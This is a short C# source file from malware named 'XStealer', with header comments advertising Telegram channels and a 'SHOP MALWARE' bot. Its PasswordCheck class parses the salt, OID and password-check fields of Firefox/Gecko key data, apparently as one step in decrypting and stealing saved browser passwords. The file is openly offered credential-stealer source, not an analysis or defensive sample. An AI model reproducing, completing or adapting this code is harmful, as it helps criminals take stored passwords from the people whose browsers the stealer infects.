// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System.Globalization;

    public class PasswordCheck
    {
        public string EntrySalt { get; } = string.Empty;
        public string OID { get; } = string.Empty;
        public string Passwordcheck { get; } = string.Empty;

        public PasswordCheck(string DataToParse)
        {
            try
            {
                int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
                EntrySalt = DataToParse.Substring(6, num);
                int num2 = DataToParse.Length - (6 + num + 36);
                OID = DataToParse.Substring(6 + num + 36, num2);
                Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
            }
            catch { }
        }
    }
}